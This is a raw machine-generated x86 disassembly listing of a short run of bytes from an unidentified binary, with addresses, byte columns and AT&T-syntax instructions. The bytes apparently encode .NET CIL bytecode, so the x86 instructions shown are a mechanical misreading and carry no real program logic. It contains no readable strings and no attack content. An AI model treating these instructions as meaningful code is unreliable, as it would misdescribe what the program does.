  404ced:	8d 02                	lea    (%edx),%eax
  404cef:	00 00                	add    %al,(%eax)
  404cf1:	01 25 16 11 14 a2    	add    %esp,0xa2141116
  404cf7:	25 17 72 22 09       	and    $0x9227217,%eax
  404cfc:	00 70 a2             	add    %dh,-0x5e(%eax)
  404cff:	6f                   	outsl  %ds:(%esi),(%dx)
  404d00:	7b 00                	jnp    0x404d02
  404d02:	00 0a                	add    %cl,(%edx)
  404d04:	26 2b 0a             	sub    %es:(%edx),%ecx
  404d07:	72 4a                	jb     0x404d53
  404d09:	08 00                	or     %al,(%eax)
  404d0b:	70 28                	jo     0x404d35
  404d0d:	53                   	push   %ebx
  404d0e:	00 00                	add    %al,(%eax)
  404d10:	0a dd                	or     %ch,%bl
  404d12:	eb 23                	jmp    0x404d37
  404d14:	00 00                	add    %al,(%eax)
  404d16:	13 15 72 fc 14 00    	adc    0x14fc72,%edx
  404d1c:	70 11                	jo     0x404d2f
  404d1e:	15 25 2d 04 26       	adc    $0x26042d25,%eax
  404d23:	14 2b                	adc    $0x2b,%al
  404d25:	05 6f 3a 00 00       	add    $0x3a6f,%eax
  404d2a:	0a 28                	or     (%eax),%ch
  404d2c:	3b 00                	cmp    (%eax),%eax
  404d2e:	00 0a                	add    %cl,(%edx)
  404d30:	28 53 00             	sub    %dl,0x0(%ebx)
  404d33:	00 0a                	add    %cl,(%edx)
  404d35:	dd c7                	ffree  %st(7)
  404d37:	23 00                	and    (%eax),%eax
  404d39:	00 02                	add    %al,(%edx)
  404d3b:	7b 3f                	jnp    0x404d7c
  404d3d:	00 00                	add    %al,(%eax)
  404d3f:	04 2c                	add    $0x2c,%al
  404d41:	0e                   	push   %cs
  404d42:	02 7b 3e             	add    0x3e(%ebx),%bh
  404d45:	00 00                	add    %al,(%eax)
  404d47:	04 14                	add    $0x14,%al
  404d49:	28 87 00 00 0a 2c    	sub    %al,0x2c0a0000(%edi)
  404d4f:	0b 72 80             	or     -0x80(%edx),%esi
  404d52:	15 00 70 28 53       	adc    $0x53287000,%eax
  404d57:	00 00                	add    %al,(%eax)
  404d59:	0a 2a                	or     (%edx),%ch
  404d5b:	00 02                	add    %al,(%edx)
  404d5d:	7b 3e                	jnp    0x404d9d
  404d5f:	00 00                	add    %al,(%eax)
  404d61:	04 72                	add    $0x72,%al
  404d63:	a0 06 00 70 16       	mov    0x16700006,%al
  404d68:	17                   	pop    %ss
  404d69:	6f                   	outsl  %ds:(%esi),(%dx)
  404d6a:	78 00                	js     0x404d6c
  404d6c:	00 0a                	add    %cl,(%edx)
  404d6e:	25 2d 04 26 14       	and    $0x1426042d,%eax
  404d73:	2b 0c 72             	sub    (%edx,%esi,2),%ecx
  404d76:	3a 08                	cmp    (%eax),%cl
  404d78:	00 70 1f             	add    %dh,0x1f(%eax)
  404d7b:	19 28                	sbb    %ebp,(%eax)
  404d7d:	88 00                	mov    %al,(%eax)
  404d7f:	00 0a                	add    %cl,(%edx)
  404d81:	13 16                	adc    (%esi),%edx
  404d83:	11 16                	adc    %edx,(%esi)
  404d85:	14 28                	adc    $0x28,%al
  404d87:	89 00                	mov    %eax,(%eax)
  404d89:	00 0a                	add    %cl,(%edx)
  404d8b:	2c 3b                	sub    $0x3b,%al
  404d8d:	02 7b 3d             	add    0x3d(%ebx),%bh
  404d90:	00 00                	add    %al,(%eax)
  404d92:	04 73                	add    $0x73,%al
  404d94:	0d 00 00 06 13       	or     $0x13060000,%eax
  404d99:	17                   	pop    %ss
  404d9a:	11 16                	adc    %edx,(%esi)
